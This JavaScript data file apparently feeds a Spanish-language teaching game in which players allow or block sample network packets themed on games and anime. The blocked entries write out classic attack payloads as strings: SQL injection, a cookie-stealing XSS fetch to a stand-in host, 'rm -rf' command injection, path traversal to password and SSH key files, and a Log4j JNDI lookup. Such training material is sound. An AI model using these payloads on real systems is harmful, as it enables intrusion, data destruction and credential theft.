const PACKET_DATABASE = [
  // ==========================================
  // 🟢 TRÁFICO LEGÍTIMO (ALLOW) - isMalicious: false
  // ==========================================
  {
    id: 1,
    isMalicious: false,
    ip: "192.168.1.45",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /css/utp_styles_main.css",
  },
  {
    id: 2,
    isMalicious: false,
    ip: "10.0.0.12",
    port: 80,
    protocol: "HTTP",
    payload: 'POST /api/auth {"user": "profesor_sistemas", "token": "valido"}',
  },
  {
    id: 3,
    isMalicious: false,
    ip: "203.0.113.5",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /assets/devvibes_logo_hd.png",
  },
  {
    id: 4,
    isMalicious: false,
    ip: "192.168.1.100",
    port: 8080,
    protocol: "TCP",
    payload: "GET /odoo/pos/panama_electronic_invoice_v2",
  },
  {
    id: 5,
    isMalicious: false,
    ip: "10.0.5.22",
    port: 1883,
    protocol: "MQTT",
    payload: '{"sensor": "temp_tanque_leche", "valor": 4.2, "estado": "ok"}',
  },
  {
    id: 6,
    isMalicious: false,
    ip: "172.16.0.4",
    port: 22,
    protocol: "SSH",
    payload: "Encrypted Handshake (Dev Team Key)",
  },
  {
    id: 7,
    isMalicious: false,
    ip: "192.168.1.88",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /models/blender_render_character_rig.obj",
  },
  {
    id: 8,
    isMalicious: false,
    ip: "8.8.8.8",
    port: 53,
    protocol: "UDP",
    payload: "DNS Query: utp.ac.pa",
  },
  {
    id: 9,
    isMalicious: false,
    ip: "10.10.10.5",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /docs/analisis_FODA_starbucks_final.pdf",
  },
  {
    id: 10,
    isMalicious: false,
    ip: "192.168.0.50",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /media/batman_vs_superman_1080p.mp4",
  },
  {
    id: 11,
    isMalicious: false,
    ip: "203.0.113.20",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /api/lol_worlds_championship_stats.json",
  },
  {
    id: 12,
    isMalicious: false,
    ip: "192.168.1.15",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /music/arcane_soundtrack_full.mp3",
  },
  // --- NUEVOS: Referencias Gaming, Anime y Cultura Dev ---
  {
    id: 23,
    isMalicious: false,
    ip: "10.1.5.88",
    port: 3074,
    protocol: "UDP",
    payload: "Call_of_Duty_Warzone_Patch_v1.45_Download_Stream",
  },
  {
    id: 24,
    isMalicious: false,
    ip: "192.168.1.200",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /manga/jujutsu_kaisen_chapter_270_raw.png",
  },
  {
    id: 25,
    isMalicious: false,
    ip: "172.16.2.10",
    port: 80,
    protocol: "HTTP",
    payload:
      'POST /matricula {"alumno": "Ale", "materia": "Estructuras de Datos"}',
  },
  {
    id: 26,
    isMalicious: false,
    ip: "104.20.5.1",
    port: 443,
    protocol: "HTTPS",
    payload:
      'POST /api/democracy {"action": "liberate", "planet": "Malevelon Creek"}', // Helldivers 2
  },
  {
    id: 27,
    isMalicious: false,
    ip: "192.168.0.33",
    port: 25565,
    protocol: "TCP",
    payload: "Minecraft Ping: 1.20.4 Vanilla Server [0/20 Players]",
  },
  {
    id: 28,
    isMalicious: false,
    ip: "8.8.4.4",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /anime/solo_leveling_episode_12_1080p.mkv",
  },
  {
    id: 29,
    isMalicious: false,
    ip: "10.2.2.2",
    port: 22,
    protocol: "SSH",
    payload: 'git push origin main -m "arregle el bug en produccion (espero)"',
  },
  {
    id: 30,
    isMalicious: false,
    ip: "142.250.190.46",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /playlists/lofi_beats_to_code_and_cry_to.mp3",
  },
  {
    id: 31,
    isMalicious: false,
    ip: "192.168.1.5",
    port: 7777,
    protocol: "UDP",
    payload: "Elden_Ring_Multiplayer: Summon Sign Data [Let me solo her]",
  },
  {
    id: 32,
    isMalicious: false,
    ip: "172.16.8.9",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /v2/library/postgres/manifests/latest", // Docker pull normal
  },
  {
    id: 33,
    isMalicious: false,
    ip: "192.168.2.11",
    port: 5000,
    protocol: "UDP",
    payload: 'Valorant Voice Comm: "Rush B, no paren!" (Audio Stream)',
  },
  {
    id: 34,
    isMalicious: false,
    ip: "10.0.0.99",
    port: 80,
    protocol: "HTTP",
    payload: "GET /memes/spiderman_pointing.jpg",
  },
  {
    id: 35,
    isMalicious: false,
    ip: "192.168.1.101",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /api/v1/chatgpt_prompt?text=como_centrar_un_div_en_css",
  },
  {
    id: 36,
    isMalicious: false,
    ip: "203.0.113.88",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /workshop/mods/skyrim_thomas_the_tank_engine_dragon.zip",
  },

  // ==========================================
  // 🔴 ATAQUES CIBERNÉTICOS (BLOCK) - isMalicious: true
  // ==========================================
  {
    id: 13,
    isMalicious: true,
    ip: "45.33.x.x",
    port: 80,
    protocol: "HTTP",
    payload: "POST /login ' OR '1'='1", // Inyección SQL Clásica
  },
  {
    id: 14,
    isMalicious: true,
    ip: "185.15.x.x",
    port: 443,
    protocol: "HTTPS",
    payload:
      "<script>fetch('http://hacker.com/?cookie='+document.cookie)</script>", // XSS
  },
  {
    id: 15,
    isMalicious: true,
    ip: "104.22.x.x",
    port: 80,
    protocol: "HTTP",
    payload: "GET /index.html; rm -rf /*", // Command Injection
  },
  {
    id: 16,
    isMalicious: true,
    ip: "198.51.x.x",
    port: 8080,
    protocol: "HTTP",
    payload: "GET ../../../../etc/passwd", // Path Traversal
  },
  {
    id: 17,
    isMalicious: true,
    ip: "Unknown",
    port: 443,
    protocol: "TCP",
    payload: "SYN FLOOD - 10,000 requests per second", // Ataque DDoS
  },
  {
    id: 18,
    isMalicious: true,
    ip: "112.55.x.x",
    port: 21,
    protocol: "FTP",
    payload: "STOR ransomware_crypt.exe", // Subida de Malware
  },
  {
    id: 19,
    isMalicious: true,
    ip: "89.100.x.x",
    port: 22,
    protocol: "SSH",
    payload: "Login attempt: root / root (Attempt 502)", // Fuerza Bruta
  },
  {
    id: 20,
    isMalicious: true,
    ip: "45.33.x.x",
    port: 80,
    protocol: "HTTP",
    payload: "SELECT * FROM users; DROP TABLE estudiantes;", // SQLi Destructiva
  },
  {
    id: 21,
    isMalicious: true,
    ip: "210.15.x.x",
    port: 23,
    protocol: "TELNET",
    payload: "CONNECT - Unencrypted Admin Access Attempt", // Protocolo Inseguro
  },
  {
    id: 22,
    isMalicious: true,
    ip: "185.15.x.x",
    port: 443,
    protocol: "HTTPS",
    payload: "<img src=x onerror=alert('Hacked')>", // XSS oculto en imagen
  },
  // --- NUEVOS: Ataques disfrazados de tendencias y juegos ---
  {
    id: 37,
    isMalicious: true,
    ip: "50.11.x.x",
    port: 21,
    protocol: "FTP",
    payload: "STOR GTA_VI_PC_Leaked_Beta.exe", // Troyano clásico
  },
  {
    id: 38,
    isMalicious: true,
    ip: "142.90.x.x",
    port: 80,
    protocol: "HTTP",
    payload: "GET /login?redirect=http://steancommunity-login.com", // Phishing (typo en Steam)
  },
  {
    id: 39,
    isMalicious: true,
    ip: "185.20.x.x",
    port: 25565,
    protocol: "TCP",
    payload: "${jndi:ldap://evil.com/Exploit}", // Exploit Log4j de Minecraft
  },
  {
    id: 40,
    isMalicious: true,
    ip: "44.55.x.x",
    port: 80,
    protocol: "HTTP",
    payload: "GET /search?anime=arcane' UNION SELECT password FROM admins--", // SQLi camuflado
  },
  {
    id: 41,
    isMalicious: true,
    ip: "111.22.x.x",
    port: 3333,
    protocol: "STRATUM",
    payload: '{"method": "login", "params": ["wallet.dogecoin_miner", "x"]}', // Criptominero no autorizado
  },
  {
    id: 42,
    isMalicious: true,
    ip: "89.44.x.x",
    port: 21,
    protocol: "FTP",
    payload: "STOR Shingeki_No_Kyojin_Final_Sub.srt.exe", // Malware de doble extensión
  },
  {
    id: 43,
    isMalicious: true,
    ip: "10.0.0.5",
    port: 80,
    protocol: "HTTP",
    payload:
      'POST /chat {"msg": "<script>alert(\'Free Riot Points!\')</script>"}', // XSS en chat de juego
  },
  {
    id: 44,
    isMalicious: true,
    ip: "Unknown",
    port: 443,
    protocol: "TCP",
    payload: "GET /never_gonna_give_you_up.mp4 (Request 50,000/sec)", // DDoS Rickroll
  },
  {
    id: 45,
    isMalicious: true,
    ip: "66.77.x.x",
    port: 443,
    protocol: "HTTPS",
    payload: "POST /upload/discord_auth_token.txt -> dest: evil-hacker.net", // Robo de token de Discord
  },
  {
    id: 46,
    isMalicious: true,
    ip: "192.168.1.15",
    port: 8080,
    protocol: "HTTP",
    payload: "GET /images/../../../../.ssh/id_rsa", // Buscando llaves privadas
  },
  {
    id: 47,
    isMalicious: true,
    ip: "201.10.x.x",
    port: 4444,
    protocol: "TCP",
    payload: "Encrypting /C:/Riot Games/League of Legends... Send 0.5 BTC", // Ransomware payload
  },
  {
    id: 48,
    isMalicious: true,
    ip: "103.40.x.x",
    port: 443,
    protocol: "HTTPS",
    payload: "GET /npm/react-dom-router-malicious-typo/v1.0.0", // Dependencia envenenada
  },
  {
    id: 49,
    isMalicious: true,
    ip: "188.50.x.x",
    port: 80,
    protocol: "HTTP",
    payload: "GET /crunchyrolI.com/login_confirm", // Phishing (I mayúscula en lugar de L minúscula)
  },
  {
    id: 50,
    isMalicious: true,
    ip: "45.22.x.x",
    port: 443,
    protocol: "HTTPS",
    payload: 'POST /api/webhook {"content": "Hello"; ping -c 4 8.8.8.8}', // Command Injection en Bot
  },
];
